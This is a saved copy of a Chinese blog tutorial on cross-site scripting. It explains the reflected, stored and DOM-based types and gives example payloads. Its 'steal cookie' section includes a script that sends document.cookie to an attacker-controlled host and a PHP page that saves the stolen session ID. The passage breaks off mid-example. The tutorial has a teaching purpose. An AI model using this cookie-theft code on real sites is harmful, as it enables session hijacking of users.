@@ -1,0 +1,1889 @@
+<!DOCTYPE html>
+<!-- saved from url=(0061)https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label1 -->
+<html lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="origin">
+    <meta property="og:description" content="1、简介 跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>XSS跨站脚本攻击 - 那一叶随风 - 博客园</title>
+    
+    <link rel="stylesheet" href="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/blog-common.min.css">
+    <link id="MainCss" rel="stylesheet" href="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/bundle-thinkinside.min.css">
+    <link type="text/css" rel="stylesheet" href="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/custom.css">
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/bundle-thinkinside-mobile.min.css">
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/phpstudy2015-6/rss">
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/phpstudy2015-6/rsd.xml">
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/phpstudy2015-6/wlwmanifest.xml">
+    <script async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/encoder.js"></script><script src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/jquery-2.2.0.min.js"></script>
+    <script src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/blog-common.min.js"></script>
+    <script>
+        var currentBlogId = 258167;
+        var currentBlogApp = 'phpstudy2015-6';
+        var cb_enable_mathjax = false;
+        var isLogined = false;
+    </script>
+    
+    
+    
+</head>
+<body>
+    <a name="top"></a>
+    <div id="page_begin_html">
+        <!--打赏 Start-->
+<script>
+/*
+    window.tctipConfig = {
+            staticPrefix: "http://static.tctip.com",
+            buttonImageId: 5,
+            buttonTip:    "dashang",
+            list:{
+                alipay: { qrimg: "https://files.cnblogs.com/files/phpstudy2015-6/zhifubao.gif"},
+                weixin: { qrimg: "https://files.cnblogs.com/files/phpstudy2015-6/wechat.GIF"},
+            }
+        };
+*/
+</script>
+<script src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/tctip.min.js" defer="">
+<!--打赏 End-->
+
+
+
+
+<script type="text/javascript">
+
+$(function() {
+	// hide #back-top first
+	$("#back-top").hide();
+	// fade in #back-top
+	$(window).scroll(function() {
+		if ($(this).scrollTop() > 500) {
+			$('#back-top').fadeIn();
+		} else {
+			$('#back-top').fadeOut();
+		}
+	});
+	// scroll body to 0px on click
+	$('#back-top a').click(function() {
+		$('body,html').animate({
+			scrollTop: 0
+		}, 800);
+		return false;
+	});
+});
+
+</script>
+<p id="back-top" style="display:none"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#top"><span></span></a></p>
+    </div>
+    
+<!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/phpstudy2015-6/"><img id="blogLogo" src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/logo.gif" alt="返回主页"></a>		
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/phpstudy2015-6/">那一叶随风</a>
+</h1>
+<h2>
+天行健，君子以自强不息
+</h2>
+
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/phpstudy2015-6/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/%E9%82%A3%E4%B8%80%E5%8F%B6%E9%9A%8F%E9%A3%8E">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="https://www.cnblogs.com/phpstudy2015-6/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			
+			<span id="stats_post_count">随笔 - 
+61&nbsp; </span>
+<span id="stats_article_count">文章 - 
+1&nbsp; </span>
+<span id="stats-comment_count">评论 - 
+115</span>
+
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    <!--done-->
+    <div id="topics">
+        <div class="post">
+            <h1 class="postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2" href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html">XSS跨站脚本攻击</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                
+<div id="cnblogs_post_body" class="blogpost-body "><a name="_labelTop"></a><div id="navCategory"><p style="font-size:18px"><b>阅读目录</b></p><ul><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label0">1、简介</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label1">2、原因解析</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label2">3、XSS攻击分类</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label3">　　3.1、反射型xss攻击</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label4">　　3.2、存贮型xss攻击</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label5">　　3.3、DOMBasedXSS（基于dom的跨站点脚本攻击）</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label6">4、XSS攻击实例分析</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label7">　　例1、简单XSS攻击</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label8">　　例2、盗取cookie</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label9">5、XSS漏洞修复</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label10">　　5.1、html实体</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label11">　　5.2、HTML Encode</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label12">　　5.3、修复漏洞方针</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label13">　　5.4、PHP中的相应函数</a></li><li><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label14">　　5.5、数据过滤类</a></li></ul></div>
+    <div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label0"></a></div><h4 align="left">1、简介</h4>
+<p>跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。</p>
+<p>XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？</p>
+<p>XSS是指恶意攻击者<strong>利用</strong>网站没有对用户提交数据进行转义处理或者过滤不足的<strong>缺点</strong>，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。</p>
+<p>从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p>
+<p><strong>XSS攻击的危害包括：</strong></p>
+<p>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p>
+<p>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p>
+<p>3、盗窃企业重要的具有商业价值的资料</p>
+<p>4、非法转账</p>
+<p>5、强制发送电子邮件</p>
+<p>6、网站挂马</p>
+<p>7、控制受害者机器向其它网站发起攻击</p>
+<p>&nbsp;</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label1"></a></div><h4 align="left">2、原因解析</h4>
+<p><strong>主要原因：</strong>过于信任客户端提交的数据！</p>
+<p><strong>解决办法：</strong>不信任任何客户端提交的数据，只要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。</p>
+<p><strong>进一步分析细节：</strong></p>
+<p>　　客户端提交的数据本来就是应用所需要的，但是恶意攻击者利用网站对客户端提交数据的信任，在数据中插入一些符号以及javascript代码，那么这些数据将会成为应用代码中的一部分了。那么攻击者就可以肆无忌惮地展开攻击啦。</p>
+<p>　　因此我们绝<strong>不可以信任</strong>任何客户端提交的数据！！！</p>
+<p>&nbsp;</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label2"></a></div><h4 align="left">3、XSS攻击分类</h4>
+<p>【了解即可，不必细究，XSS根源就是没完全过滤客户端提交的数据】</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label3"></a></div><h4 align="left">　　3.1、反射型xss攻击</h4>
+<p>　　又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。</p>
+<p><strong>简单例子</strong></p>
+<p><strong>正常发送消息：</strong></p>
+<p>http://www.test.com/message.php?send=Hello,World！</p>
+<p>接收者将会接收信息并显示Hello,Word</p>
+<p>非正常发送消息：</p>
+<p>http://www.test.com/message.php?send=&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;！</p>
+<p>接收者接收消息显示的时候将会弹出警告窗口</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label4"></a></div><h4 align="left">　　3.2、存贮型xss攻击</h4>
+<p>　　又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器,脚本执行。持久的XSS相比非持久性XSS攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。谷歌的orkut曾经就遭受到XSS。</p>
+<p><strong>简单例子：</strong></p>
+<p>从名字就可了解到存储型XSS攻击就是将攻击代码存入数据库中，然后客户端打开时就执行这些攻击代码。例如留言板</p>
+<p>留言板表单中的表单域：&lt;input type=“text” name=“content” value=“这里是用户填写的数据”&gt;</p>
+<p><strong>正常操作：</strong></p>
+<p>用户是提交相应留言信息；将数据存储到数据库；其他用户访问留言板，应用去数据并显示。</p>
+<p><strong>非正常操作：</strong></p>
+<p>攻击者在value填写&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;【或者html其他标签（破坏样式。。。）、一段攻击型代码】；</p>
+<p>将数据存储到数据库中；</p>
+<p>其他用户取出数据显示的时候，将会执行这些攻击性代码</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label5"></a></div><h4 align="left">　　3.3、DOMBasedXSS（基于dom的跨站点脚本攻击）</h4>
+<p>　　基于DOM的XSS有时也称为type0XSS。当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。</p>
+<p>　　通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。</p>
+<p>　　前提是易受攻击的网站有一个HTML页面采用不安全的方式从document.location 或document.URL 或 document.referrer获取数据（或者任何其他攻击者可以修改的对象）。</p>
+<p><strong>简单例子</strong>：</p>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">HTML</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 2</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">TITLE</span><span style="color: #0000ff;">&gt;</span>Welcome!<span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">TITLE</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 3</span> <span style="color: #000000;">Hi
+</span><span style="color: #008080;"> 4</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">SCRIPT</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 5</span> <span style="background-color: #f5f5f5; color: #0000ff;">var</span><span style="background-color: #f5f5f5; color: #000000;"> pos</span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">document.URL.indexOf(</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">name=</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">)</span><span style="background-color: #f5f5f5; color: #000000;">+</span><span style="background-color: #f5f5f5; color: #000000;">5</span><span style="background-color: #f5f5f5; color: #000000;">;
+</span><span style="color: #008080;"> 6</span> <span style="background-color: #f5f5f5; color: #000000;">document.write(document.URL.substring(pos,document.URL.length));
+</span><span style="color: #008080;"> 7</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">SCRIPT</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 8</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">BR</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 9</span> <span style="color: #000000;">Welcome to our system
+</span><span style="color: #008080;">10</span> <span style="color: #000000;">…
+</span><span style="color: #008080;">11</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">HTML</span><span style="color: #0000ff;">&gt;</span></pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p>这个例子是个欢迎页面，name是截取URL中get过来的name参数</p>
+<p><strong>正常操作：</strong></p>
+<p>http://www.vulnerable.site/welcome.html?name=Joe</p>
+<p><strong>非正常操作：</strong></p>
+<p>http://www.vulnerable.site/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</p>
+<p>　　将产生xss条件。让我们看看为什么：受害者的浏览器接收到这个链接，发送HTTP请求到www.vulnerable.site并且接受到上面的HTML页。受害者的浏览器开始解析这个HTML为DOM，DOM包含一个对象叫document，document里面有个URL属性，这个属性里填充着当前页面的URL。当解析器到达javascript代码，它会执行它并且修改你的HTML页面。倘若代码中引用了document.URL，那么，这部分字符串将会在解析时嵌入到HTML中，然后立即解析，同时，javascript代码会找到(alert(…))并且在同一个页面执行它，这就产生了xss的条件。</p>
+<p><strong>注意:</strong></p>
+<p>　　1. 恶意程序脚本在任何时候不会嵌入到处于自然状态下的HTML页面（这和其他种类的xss不太一样）。</p>
+<p>　　2.这个攻击只有在浏览器没有修改URL字符时起作用。 当url不是直接在地址栏输入，Mozilla.会自动转换在document.URL中字符&lt;和&gt;（转化为%3C&nbsp;和&nbsp;%3E），因此在就不会受到上面示例那样的攻击了，在IE6下没有转换&lt;和&gt;，因此他很容易受到攻击。</p>
+<p>　　当然，直接嵌入到HTML只是攻击的一个挂载点，有很多脚本不需要依赖&lt;和&gt;漏洞，因此Mozilla通常也是无法阻止这些攻击的。</p>
+<p>【这段出自：<a href="http://www.oschina.net/translate/dom-based-xss-of-third-kind" target="_blank">http://www.oschina.net/translate/dom-based-xss-of-third-kind</a>】</p>
+<p>&nbsp;</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label6"></a></div><h4 align="left">4、XSS攻击实例分析</h4>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label7"></a></div><h4 align="left">　　例1、简单XSS攻击</h4>
+<p>留言类，简单注入javascript</p>
+<p>有个表单域：&lt;input type=“text” name=“content” value=“这里是用户填写的数据”&gt;</p>
+<p>1、假若用户填写数据为：&lt;script&gt;alert('foolish!')&lt;/script&gt;（或者&lt;script type="text/javascript" src="./xss.js"&gt;&lt;/script&gt;）</p>
+<p>2、提交后将会弹出一个foolish警告窗口，接着将数据存入数据库</p>
+<p>3、等到别的客户端请求这个留言的时候，将数据取出显示留言时将执行攻击代码，将会显示一个foolish警告窗口。</p>
+<p>【将数据改成html标签进行攻击，则会将原本的样式打乱。。。。。。。。】</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label8"></a></div><h4 align="left">　　例2、盗取cookie</h4>
+<p>1、网站所在域名为www.test88.com、攻击者控制的主机www.linuxtest.com</p>
+<p>2、test88.com中的表单，xss.html</p>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">&lt;!</span><span style="color: #ff00ff;">DOCTYPE html</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 2</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">html</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 3</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">head</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 4</span>     <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">title</span><span style="color: #0000ff;">&gt;</span>xss攻击<span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">title</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 5</span>     <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">meta </span><span style="color: #ff0000;">charset</span><span style="color: #0000ff;">="utf-8"</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 6</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">head</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 7</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">body</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 8</span> 
+<span style="color: #008080;"> 9</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">form </span><span style="color: #ff0000;">action</span><span style="color: #0000ff;">="./test99.php"</span><span style="color: #ff0000;"> method</span><span style="color: #0000ff;">="post"</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">10</span> 留言：<span style="color: #0000ff;">&lt;</span><span style="color: #800000;">input </span><span style="color: #ff0000;">type</span><span style="color: #0000ff;">="text"</span><span style="color: #ff0000;"> name</span><span style="color: #0000ff;">="content"</span><span style="color: #ff0000;"> value</span><span style="color: #0000ff;">=""</span><span style="color: #0000ff;">&gt;&lt;</span><span style="color: #800000;">br</span><span style="color: #0000ff;">/&gt;</span>
+<span style="color: #008080;">11</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">input </span><span style="color: #ff0000;">type</span><span style="color: #0000ff;">="submit"</span><span style="color: #ff0000;"> name</span><span style="color: #0000ff;">=""</span><span style="color: #ff0000;"> value</span><span style="color: #0000ff;">='提交'</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">12</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">form</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">13</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">br</span><span style="color: #0000ff;">/&gt;</span>留言记录：<span style="color: #0000ff;">&lt;</span><span style="color: #800000;">br</span><span style="color: #0000ff;">/&gt;</span>
+<span style="color: #008080;">14</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">body</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">15</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">html</span><span style="color: #0000ff;">&gt;</span></pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p>3、恶意攻击者插入相应代码</p>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre><span style="color: #008080;">1</span> &lt;script&gt;
+<span style="color: #008080;">2</span> <span style="color: #0000ff;">var</span> Str=document.cookie;               <span style="color: #008000;">//</span><span style="color: #008000;">获取cookie</span>
+<span style="color: #008080;">3</span> <span style="color: #0000ff;">var</span> a =document.createElement('a');        <span style="color: #008000;">//</span><span style="color: #008000;">创建a标签</span>
+<span style="color: #008080;">4</span> a.href='http://www.linuxtest.com/test2.php?'+Str;   <span style="color: #008000;">//</span><span style="color: #008000;">攻击者主机</span>
+<span style="color: #008080;">5</span> a.innerHTML="&lt;img src='./aa.jpg'&gt;";        <span style="color: #008000;">//</span><span style="color: #008000;">掩护图片</span>
+<span style="color: #008080;">6</span> document.body.appendChild(a);              <span style="color: #008000;">//</span><span style="color: #008000;">将标签添加到页面中</span>
+<span style="color: #008080;">7</span> &lt;/script&gt;</pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p>4、数据（攻击代码）插入数据库</p>
+<p>5、攻击者控制的主机中设置接收盗取的cookie</p>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre><span style="color: #008080;">1</span> &lt;?<span style="color: #000000;">php
+</span><span style="color: #008080;">2</span> <span style="color: #008080;">header</span>("content-type:text/html;charset=utf8"<span style="color: #000000;">);
+</span><span style="color: #008080;">3</span> <span style="color: #0000ff;">echo</span> "你的PHPSESSID被盗啦"<span style="color: #000000;">;
+</span><span style="color: #008080;">4</span> <span style="color: #0000ff;">echo</span> "&lt;pre&gt;"<span style="color: #000000;">;
+</span><span style="color: #008080;">5</span> <span style="color: #008080;">print_r</span>(<span style="color: #800080;">$_GET</span><span style="color: #000000;">);
+</span><span style="color: #008080;">6</span> <span style="color: #0000ff;">echo</span> "&lt;/pre&gt;"<span style="color: #000000;">;
+</span><span style="color: #008080;">7</span> <span style="color: #800080;">$cookie</span>=<span style="color: #800080;">$_GET</span>['PHPSESSID'<span style="color: #000000;">];
+</span><span style="color: #008080;">8</span> <span style="color: #008080;">file_put_contents</span>('./xss.txt', <span style="color: #800080;">$cookie</span><span style="color: #000000;">);
+</span><span style="color: #008080;">9</span> ?&gt; </pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p><strong>开始模拟测试</strong></p>
+<p>1、test88.com中设置生成sessionID代码</p>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre><span style="color: #008080;">1</span> &lt;?<span style="color: #000000;">php
+</span><span style="color: #008080;">2</span> <span style="color: #008080;">session_start</span><span style="color: #000000;">();
+</span><span style="color: #008080;">3</span> <span style="color: #800080;">$_SESSION</span>['xss']='xssssss'<span style="color: #000000;">;
+</span><span style="color: #008080;">4</span> <span style="color: #0000ff;">echo</span> "&lt;pre&gt;"<span style="color: #000000;">;
+</span><span style="color: #008080;">5</span> <span style="color: #008080;">print_r</span>(<span style="color: #800080;">$_SESSION</span><span style="color: #000000;">);
+</span><span style="color: #008080;">6</span> <span style="color: #0000ff;">echo</span> "&lt;/pre&gt;";<span style="color: #0000ff;">die</span><span style="color: #000000;">;
+</span><span style="color: #008080;">7</span> ?&gt; </pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p>2、客户端访问上面代码并生成自己的sessionID</p>
+<p><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/789055-20170426091548272-28301397.jpg" alt=""></p>
+<p>3、客户端访问xss.html</p>
+<p>#下面为模拟被攻击后取出数据的xss.html代码（显示数据）</p>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">&lt;!</span><span style="color: #ff00ff;">DOCTYPE html</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 2</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">html</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 3</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">head</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 4</span>     <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">title</span><span style="color: #0000ff;">&gt;</span>xss攻击<span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">title</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 5</span>     <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">meta </span><span style="color: #ff0000;">charset</span><span style="color: #0000ff;">="utf-8"</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 6</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">head</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 7</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">body</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 8</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">form </span><span style="color: #ff0000;">action</span><span style="color: #0000ff;">="./test99.php"</span><span style="color: #ff0000;"> method</span><span style="color: #0000ff;">="post"</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;"> 9</span> 留言：<span style="color: #0000ff;">&lt;</span><span style="color: #800000;">input </span><span style="color: #ff0000;">type</span><span style="color: #0000ff;">="text"</span><span style="color: #ff0000;"> name</span><span style="color: #0000ff;">="content"</span><span style="color: #ff0000;"> value</span><span style="color: #0000ff;">=""</span><span style="color: #0000ff;">&gt;&lt;</span><span style="color: #800000;">br</span><span style="color: #0000ff;">/&gt;</span>
+<span style="color: #008080;">10</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">input </span><span style="color: #ff0000;">type</span><span style="color: #0000ff;">="submit"</span><span style="color: #ff0000;"> name</span><span style="color: #0000ff;">=""</span><span style="color: #ff0000;"> value</span><span style="color: #0000ff;">='提交'</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">11</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">form</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">12</span> &lt;br/&gt;留言记录：&lt;br/&gt;
+<span style="color: #008080;">13</span> <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">script</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">14</span> <span style="background-color: #f5f5f5; color: #0000ff;">var</span><span style="background-color: #f5f5f5; color: #000000;"> Str</span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">document.cookie;               </span><span style="background-color: #f5f5f5; color: #008000;">//</span><span style="background-color: #f5f5f5; color: #008000;">获取cookie</span>
